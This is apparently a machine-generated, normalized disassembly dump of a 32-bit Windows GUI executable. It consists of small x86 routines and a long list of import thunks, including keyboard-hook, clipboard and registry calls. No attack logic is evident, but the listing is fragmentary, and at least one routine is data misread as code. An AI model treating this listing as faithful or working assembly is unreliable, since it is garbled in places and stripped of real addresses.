j_sub_4044ac#2
jmp sub_4044ac
sub_4044f5
retn
sub_4044fd
retn
sub_40453f
retn
sub_404698
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
sub_4046b0
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404808
retn
sub_40481a
retn
sub_40481c
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404a10
mov ecx 0x1
jmp sub_40497c
sub_404a1a
retn
sub_404a50
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404b54
mov ecx 0x1
jmp sub_404a68
sub_404b5e
retn
sub_404b60
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404d86
retn
sub_404d88
push edx
call sub_4026bc
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404a10
pop eax
sub_404d9c
push eax
call sub_404b54
pop eax
call sub_4026dc
retn
sub_404dac
mov al 0x11
jmp sub_402818
sub_404dd7
retn
sub_404de8
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c94
pop ebp
retn 0x4
j_sub_404a68
jmp sub_404a68
sub_404dfd
retn
sub_404e00
call sub_404fa0
retn
sub_40502c
call sub_405004
retn
sub_405375
jmp sub_4039e4
sub_4054e0
call sub_4054f0
retn
sub_4054e8
call sub_405510
retn
sub_4054f0
push ebx
mov ebx eax
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4055ab
jmp sub_403730
sub_4055cc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405640
jmp sub_4039e4
sub_405647
pop ecx
pop ebp
retn
sub_4056c0
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_4056cc
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_4056d8
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402818
sub_4056e8
call sub_403228
mov [ eax + 0x4 ] 0x1
retn
sub_405720
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405a0f
jmp sub_4039e4
sub_405a16
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405ab3
jmp sub_4039e4
sub_405aba
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b03
jmp sub_4039e4
sub_405b0a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405bce
jmp sub_4039e4
sub_405bd5
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405c26
jmp sub_4039e4
sub_405c2d
pop ebp
retn
sub_405d04
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405d24
push eax
push 0x40
call LocalAlloc
retn
sub_405d30
mov eax 0x10
retn
sub_405dbc
mov eax rw-data
call sub_4055cc
retn
sub_405e31
jmp sub_4039e4
sub_405e38
pop ebp
retn
sub_405e3c
sub [ rw-data ] 0x1
retn
sub_405e44
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405e60
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405ea9
jmp sub_4039e4
sub_405eb0
pop ebp
retn
sub_405eb4
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ __import_lookup_table_6(kernel32:GetDateFormatA) ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ GlobalFree@IAT ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_406160
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CopyEnhMetaFileA
jmp [ __import_lookup_table_8(gdi32:CopyEnhMetaFileA) ]
CreateBitmap
jmp [ __import_lookup_table_8(gdi32:CreateBitmap) ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtCreatePen
jmp [ __import_lookup_table_8(gdi32:ExtCreatePen) ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ GetEnhMetaFileHeader@IAT ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ MoveToEx@IAT ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
PolyPolyline
jmp [ PolyPolyline@IAT ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SelectClipRgn
jmp [ __import_lookup_table_8(gdi32:SelectClipRgn) ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ __import_lookup_table_8(gdi32:SetViewportOrgEx) ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharLowerBuffA
jmp [ __import_lookup_table_9(user32:CharLowerBuffA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CloseClipboard
jmp [ __import_lookup_table_9(user32:CloseClipboard) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMDIWindowA
jmp [ __import_lookup_table_9(user32:CreateMDIWindowA) ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ __import_lookup_table_9(user32:DrawIconEx) ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EmptyClipboard
jmp [ __import_lookup_table_9(user32:EmptyClipboard) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetCaretPos
jmp [ __import_lookup_table_9(user32:GetCaretPos) ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDoubleClickTime
jmp [ __import_lookup_table_9(user32:GetDoubleClickTime) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetLastInputInfo
jmp [ GetLastInputInfo@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
GetMessageTime
jmp [ GetMessageTime@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollPos
jmp [ GetScrollPos@IAT ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ GetSubMenu@IAT ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ GetSysColorBrush@IAT ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsCharAlphaNumericA
jmp [ IsCharAlphaNumericA@IAT ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBeep
jmp [ __import_lookup_table_9(user32:MessageBeep) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ OemToCharA@IAT ]
OpenClipboard
jmp [ __import_lookup_table_9(user32:OpenClipboard) ]
PeekMessageA
jmp [ __import_lookup_table_9(user32:PeekMessageA) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetKeyboardState
jmp [ SetKeyboardState@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ __import_lookup_table_9(user32:TranslateMDISysAccel) ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnionRect
jmp [ UnionRect@IAT ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_4069a4
call GetTickCount
retn
sub_4069ac
xor eax eax
retn
sub_4069b0
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_4069c0
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_4069dc
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_4069f0
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406a28
call sub_406998
retn
sub_406a30
call sub_406998
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406c0d
jmp sub_4039e4
sub_406c14
pop ebp
retn
sub_406c18
sub [ rw-data ] 0x1
retn
sub_406c45
jmp sub_4039e4
sub_406c4c
pop ebp
retn
sub_406c50
sub [ rw-data ] 0x1
retn
sub_406f55
jmp sub_4039e4
sub_406f5c
pop ebp
retn
sub_406f60
sub [ rw-data ] 0x1
retn
sub_407a3f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405720
sub_407a49
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405734
sub_407de0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407da8
test eax eax
sete al
pop esi
pop ebx
retn
sub_4082f8
call sub_4082d4
retn
sub_408390
push eax
call CloseHandle
retn
sub_408560
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408574
push esi
mov esi eax
xchg edx eax
call sub_4028b8
mov eax esi
pop esi
retn
sub_408734
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026bc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408748
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408780
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026dc
sub_4087e8
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402818
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_40880c
push ebx
mov ebx eax
mov eax ebx
call sub_403fe0
pop ebx
retn
sub_408b6f
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403fe0
pop eax
pop ebx
retn
sub_408e27
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408f82
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4092df
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4092df
sub_40939c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044a0
mov edx esi
xor ecx ecx
call sub_409228
pop esi
pop ebx
retn
sub_409410
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044a0
mov edx esi
mov cl 0x1
call sub_409228
pop esi
pop ebx
retn
sub_409a8a
jmp sub_4039e4
sub_409a91
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409b82
jmp sub_4039e4
sub_409b89
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a32d
jmp sub_4039e4
sub_40a334
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a3bc
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a360
pop ebp
retn 0x8
sub_40a501
jmp sub_4039e4
sub_40a508
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a9ab
jmp sub_4039e4
sub_40a9b2
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ae97
jmp sub_4039e4
sub_40ae9e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40af49
jmp sub_4039e4
sub_40af50
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40aff3
jmp sub_4039e4
sub_40affa
pop esi
pop ecx
pop ebp
retn
sub_40b1d6
jmp sub_4039e4
sub_40b1dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b234
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b526
jmp sub_4039e4
sub_40b5f4
jmp sub_4039e4
sub_40b61c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403244
sub_40b718
pop ebx
retn
sub_40b7b8
jmp sub_4039e4
sub_40b7bf
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b7c8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403a1c
sub_40b7d5
retn
sub_40b7d8
push ebp
mov ebp esp
call sub_40b71c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b7c8
pop ebp
retn 0x4
sub_40b7f4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
retn
sub_40b88c
push ebx
mov ebx eax
mov eax ebx
call sub_40b80c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40ba5f
jmp sub_4039e4
sub_40ba66
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bb2b
jmp sub_4039e4
sub_40bb32
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bb3c
call sub_40b3c8
mov eax 0x1
call sub_403fc8
sub_40bcc0
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bd99
jmp sub_4039e4
sub_40bdb6
jmp sub_4039e4
sub_40bdbd
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40be68
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bdcc
mov ecx eax
sub_40c054
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c074
push eax
call CharNextA
retn
sub_40c324
jmp sub_4039e4
sub_40c32b
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c394
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c7eb
jmp sub_4039e4
sub_40c7f2
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40c930
jmp sub_4039e4
sub_40c937
pop ebx
mov esp ebp
pop ebp
retn
sub_40c93c
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40c8a0
sub_40c94c
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40c968
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026dc
pop ebx
retn
sub_40c9f0
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40c9fc
xchg [ eax ] edx
mov eax edx
retn
sub_40ca5c
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40caec
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cc04
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cc2c
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40cea7
jmp sub_4039e4
sub_40ceae
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40cf1c
jmp sub_4039e4
sub_40cf23
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cf41
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40cf3a
jmp sub_4039e4
sub_40cf41
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40cf4c
sbb eax 0x4000000
and eax [ edi ]
cmp al 0x31
inc edi
add ah bh
and al [ edi ]
pop esp
xor [ edi ] al
hlt
sub_40d404
jmp sub_4039e4
sub_40d40b
pop ebp
retn
VariantInit
jmp [ VariantInit@IAT ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d484
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d4ea
jmp sub_4039e4
sub_40d4f1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d556
jmp sub_4039e4
sub_40d55d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d5c2
jmp sub_4039e4
sub_40d5c9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d62e
jmp sub_4039e4
sub_40d635
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d69a
jmp sub_4039e4
sub_40d6a1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d719
jmp sub_4039e4
sub_40d720
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d78c
jmp sub_4039e4
sub_40d793
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d7fc
jmp sub_4039e4
sub_40d803
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d870
jmp sub_4039e4
sub_40d877
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40dbfd
jmp sub_4039e4
sub_40dc04
pop ebp
retn
sub_40dc08
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40d8cc
sub_40dc19
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e23a
jmp sub_4039e4
sub_40e241
pop ecx
pop ebp
retn
sub_40e2d3
jmp sub_4039e4
sub_40e2da
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e32a
jmp sub_4039e4
sub_40e331
pop ecx
pop ebp
retn
sub_40e3c3
jmp sub_4039e4
sub_40e3ca
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e41a
jmp sub_4039e4
sub_40e421
pop ecx
pop ebp
retn
sub_40e669
jmp sub_4039e4
sub_40e670
pop ebx
mov esp ebp
pop ebp
retn
sub_40e702
jmp sub_4039e4
sub_40e709
pop ecx
pop ebp
retn
sub_40e70c
push ebx
mov ebx eax
mov eax ebx
call sub_40e9a4
mov [ ebx ] 0x1
pop ebx
retn
sub_40e9a4
test [ eax ] 0xbfe8
jne r-xdata
call sub_40e928
